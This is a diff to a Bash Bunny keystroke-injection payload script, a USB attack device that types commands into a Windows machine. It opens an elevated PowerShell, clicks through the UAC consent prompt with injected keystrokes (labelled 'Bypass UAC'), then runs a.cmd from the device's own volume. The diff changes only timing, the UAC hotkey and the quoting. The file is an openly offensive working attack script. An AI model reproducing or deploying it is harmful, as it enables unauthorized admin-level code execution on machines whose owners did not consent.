@@ -26,28 +26,28 @@ ATTACKMODE HID STORAGE
 LED B 200
 
 # Launch powershell as admin
+sleep 0.2
 Q GUI r
-Q DELAY 100
+sleep 0.1
 Q STRING powershell Start-Process powershell -Verb runAs
 Q ENTER
 
 # Bypass UAC
-Q DELAY 3000
-Q ALT o
-Q ENTER
-Q DELAY 500
+sleep 3
+Q ALT y
+sleep 0.5
 
 # Start a.cmd
-Q STRING '.((gwmi win32_volume -f '"'"'label='"''"'BashBunny'"'''"').Name+'"'"'payloads/'
+Q STRING ".((gwmi win32_volume -f \"label='BashBunny'\").Name+\"payloads/"
 Q STRING $SWITCH_POSITION
-Q STRING '/a.cmd'"'"')'
+Q STRING "/a.cmd\")"
 Q ENTER
 
 # Wait for a.cmd to finish and exit
 
 LED R B 500
 
-Q DELAY 3000
+sleep 3
 Q STRING exit
 Q ENTER
 
